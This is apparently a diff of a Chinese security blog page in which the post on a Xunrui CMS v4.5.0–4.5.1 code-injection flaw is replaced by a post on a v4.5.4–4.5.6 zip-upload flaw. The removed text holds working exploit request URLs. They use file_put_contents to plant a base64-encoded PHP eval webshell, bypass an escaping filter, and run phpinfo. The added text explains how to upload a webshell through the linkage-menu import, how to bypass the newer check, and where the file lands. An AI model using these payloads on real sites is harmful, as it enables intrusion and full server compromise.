@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='触发条件 一个条件: 1.迅睿CMS 版本为v4.5.0到v4.5.1 漏洞分析 https://xz.aliyun.com/t/10002 http://w4nder.top/index.php/2021/09/18/xunruicms-rce/ Internet Archive&amp;rsquo;s Wayback Machine: 1 https://web.archive.org/web/*/https://xz.aliyun.com/t/10002 1 https://web.archive.org/web/*/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/ google快照: 1 https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002&#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja 1 http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/&#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja bing快照: 只有xz'><title>迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='迅睿CMS v4.5.4到v4.5.6(目前最新版)'><title>迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞</title>
 
-<link rel='canonical' href='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/'>
+<link rel='canonical' href='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/'>
 
-<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞'>
-<meta property='og:description' content='触发条件 一个条件: 1.迅睿CMS 版本为v4.5.0到v4.5.1 漏洞分析 https://xz.aliyun.com/t/10002 http://w4nder.top/index.php/2021/09/18/xunruicms-rce/ Internet Archive&amp;rsquo;s Wayback Machine: 1 https://web.archive.org/web/*/https://xz.aliyun.com/t/10002 1 https://web.archive.org/web/*/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/ google快照: 1 https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002&#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja 1 http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/&#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja bing快照: 只有xz'>
-<meta property='og:url' content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/'>
+<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞'>
+<meta property='og:description' content='迅睿CMS v4.5.4到v4.5.6(目前最新版)'>
+<meta property='og:url' content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/'>
 <meta property='og:site_name' content='Weltolk'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='expliot-db' /><meta property='article:published_time' content='2022-05-31T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-31T00:00:00&#43;00:00'/><meta property='og:image' content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db.png' />
-<meta name="twitter:title" content="迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞">
-<meta name="twitter:description" content="触发条件 一个条件: 1.迅睿CMS 版本为v4.5.0到v4.5.1 漏洞分析 https://xz.aliyun.com/t/10002 http://w4nder.top/index.php/2021/09/18/xunruicms-rce/ Internet Archive&amp;rsquo;s Wayback Machine: 1 https://web.archive.org/web/*/https://xz.aliyun.com/t/10002 1 https://web.archive.org/web/*/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/ google快照: 1 https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002&#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja 1 http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/&#43;&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja bing快照: 只有xz"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='expliot-db' /><meta property='article:published_time' content='2022-05-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-02T00:00:00&#43;00:00'/><meta property='og:image' content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db.png' />
+<meta name="twitter:title" content="迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞">
+<meta name="twitter:description" content="迅睿CMS v4.5.4到v4.5.6(目前最新版)"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db.png' />
     <link rel="shortcut icon" href="/img/favicon.png" />
 
     </head>
@@ -271,13 +271,13 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
-                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png"
-                        srcset="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png 800w, /p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_1600x0_resize_box_3.png 1600w"
+            <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png"
+                        srcset="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png 800w, /p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_1600x0_resize_box_3.png 1600w"
                         width="800" 
                         height="240" 
                         loading="lazy"
-                        alt="Featured image of post 迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞" />
+                        alt="Featured image of post 迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞" />
                 
             </a>
         </div>
@@ -296,9 +296,13 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞</a>
+            <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞</a>
         </h2>
     
+        
+        <h3 class="article-subtitle">
+            迅睿CMS v4.5.4到v4.5.6(目前最新版)
+        </h3>
         
     </div>
 
@@ -315,7 +319,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">May 31, 2022</time>
+                <time class="article-time--published">May 02, 2022</time>
             </div>
         
 
@@ -330,7 +334,7 @@
 
 
                 <time class="article-time--reading">
-                    1 minute read
+                    3 minute read
                 </time>
             </div>
         
@@ -344,112 +348,30 @@
     <section class="article-content">
     
     
-    <h2 id="触发条件">触发条件</h2>
-<p>一个条件:</p>
-<p>1.迅睿CMS 版本为v4.5.0到v4.5.1</p>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p><a class="link" href="https://xz.aliyun.com/t/10002"  target="_blank" rel="noopener"
-    >https://xz.aliyun.com/t/10002</a></p>
-<p><a class="link" href="http://w4nder.top/index.php/2021/09/18/xunruicms-rce/"  target="_blank" rel="noopener"
-    >http://w4nder.top/index.php/2021/09/18/xunruicms-rce/</a></p>
-<p>Internet Archive&rsquo;s Wayback Machine:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://web.archive.org/web/*/https://xz.aliyun.com/t/10002
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://web.archive.org/web/*/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>google快照:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>bing快照:</p>
-<p>只有xz的,没有w4nder的</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002&amp;d=4793325569704282&amp;mkt=zh-CN&amp;setlang=en-US&amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="一个利用方式">一个利用方式</h2>
-<p>写webshell文件:</p>
-<p>写入的文件默认是在网站根目录下</p>
-<p>经过测试,如果写入的内容包含<code>&lt;?</code>,会被url转义,但是先写<code>&lt;</code>再写<code>?</code>就不会被转义</p>
-<p>写入php标记为<code>&lt;?='';?&gt;</code>的php文件:</p>
-<p>1.先写<code>&lt;</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&lt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>2.写剩余的语句:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?=&#39;&#39;;file_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>写入php标记为<code>&lt;?php ?&gt;</code>的php文件</p>
-<p>1.先写<code>&lt;</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&lt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>2.写剩余的语句:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents(&#39;webshell.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==&#39;));%20param2=FILE_APPEND
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>写完之后,访问webshell2.php,会在同目录下生成webshell.php文件,webshell.php即为webshell</p>
-<h2 id="执行无参函数">执行无参函数</h2>
-<p>如果想执行无参函数,例如<code>phpinfo();</code>,将url中的<code>param0</code>参数设为<code>-1</code>即可:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=phpinfo%20param0=-1
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
+    <h2 id="来源">来源</h2>
+<p><a class="link" href="https://www.0daying.com/post-71.html"  target="_blank" rel="noopener"
+    >https://www.0daying.com/post-71.html</a></p>
+<h2 id="触发条件">触发条件</h2>
+<p>两个条件:</p>
+<p>1.迅睿CMS 版本为v4.5.4到v4.5.6(目前最新版)</p>
+<p>2.登录后台,且为管理员或具有&quot;应用&quot;-&gt;&ldquo;联动菜单&quot;的管理权限</p>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>后台&quot;应用&rdquo;-&gt;&ldquo;联动菜单&rdquo;-&gt;&ldquo;导入&quot;处可上传zip文件,且该处没有对用户上传的zip压缩文件做相应的过滤,导致用户可以上传任意文件</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="版本v454">版本v4.5.4</h3>
+<p>将要上传的文件压缩为zip格式,然后登陆后台,在具备相关权限的情况下,在&quot;应用&rdquo;-&gt;&ldquo;联动菜单&rdquo;-&gt;&ldquo;导入&quot;处直接上传该zip文件,同时上传时必须要抓包,响应包中会返回上传的文件的物理路径</p>
+<p>响应包中返回的物理路径通常为<code>*/cache/temp/*.zip</code>,而通过该漏洞上传的zip文件在上传成功后会自动解压,自动解压的过程中会自动在zip文件的同目录下创建一个名为压缩包去掉后缀名的文件名的目录,再将压缩包内的文件解压到此目录,因此,通常情况下如果上传一个名为webshell.zip,且压缩包内有一个名为webshell.php的文件的压缩包,那么,通过该漏洞上传zip文件之后,压缩包内的webshell.php文件的物理路径为<code>*/cache/temp/webshell/webshell.php</code>,通过url访问为http://domain:post/cache/temp/webshell/webshell.php</p>
+<h3 id="版本v455和版本v456目前最新版">版本v4.5.5和版本v4.5.6(目前最新版)</h3>
+<p>相比版本v4.5.4,这两个版本增加了对压缩包内文件的检测,但是此处我们先不尝试绕过相应的检测,而是尝试另一个更为简单的方法</p>
+<p>这两个版本未对压缩包内的文件夹进行递归检测,因此只要把恶意文件放在文件夹内再压缩然后上传即可</p>
+<p>相比版本v4.5.4,在上传该zip压缩文件时依旧可以通过抓包获取文件的物理路径,同时因为增加了一层文件夹,相应的解压之后的压缩包内的文件的物理路径变为<code>*/cache/temp/linkage/webshell/webshell/webshell.php</code>,url变为http://domain:post/cache/temp/linkage/webshell/webshell/webshell.php</p>
+<h2 id="poc--exp">POC &amp;&amp; EXP</h2>
+<p>很简单,我就不写了,不过注意目标站点的cms可能有坑,比如版本号低但实际的站点文件已经更新过了</p>
+<h3 id="poc">POC</h3>
+<p>登录后台,获取版本号,然后验证一下是否为管理员或具有&quot;应用&rdquo;-&gt;&ldquo;联动菜单&quot;的管理权限即可</p>
+<h3 id="exp">EXP</h3>
+<p>登录后台,然后在&quot;应用&rdquo;-&gt;&ldquo;联动菜单&rdquo;-&gt;&ldquo;导入&quot;处上传zip文件</p>
+
 </section>
 
 
@@ -491,15 +413,15 @@
             
                 
 <article class="has-image">
-    <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
         
         
             <div class="article-image">
-                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db.d6d0f23494fcfe00d4fac72faebda90f_hud9700ca58d822386b8178068bd5ae476_8790_250x150_fill_box_smart1_3.png" 
+                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db.d6d0f23494fcfe00d4fac72faebda90f_hud9700ca58d822386b8178068bd5ae476_8790_250x150_fill_box_smart1_3.png" 
                         width="250" 
                         height="150" 
                         loading="lazy"
-                        alt="Featured image of post 迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞"
+                        alt="Featured image of post 迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞"
                         
                         data-hash="md5-1tDyNJT8/gDU&#43;scvrr2pDw==">
                 
@@ -507,7 +429,7 @@
         
 
         <div class="article-details">
-            <h2 class="article-title">迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞</h2>
+            <h2 class="article-title">迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞</h2>
         </div>
     </a>
 </article>
@@ -727,10 +649,21 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
+    <li><a href="#来源">来源</a></li>
     <li><a href="#触发条件">触发条件</a></li>
-    <li><a href="#漏洞分析">漏洞分析</a></li>
-    <li><a href="#一个利用方式">一个利用方式</a></li>
-    <li><a href="#执行无参函数">执行无参函数</a></li>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞利用">漏洞利用</a>
+      <ol>
+        <li><a href="#版本v454">版本v4.5.4</a></li>
+        <li><a href="#版本v455和版本v456目前最新版">版本v4.5.5和版本v4.5.6(目前最新版)</a></li>
+      </ol>
+    </li>
+    <li><a href="#poc--exp">POC &amp;&amp; EXP</a>
+      <ol>
+        <li><a href="#poc">POC</a></li>
+        <li><a href="#exp">EXP</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
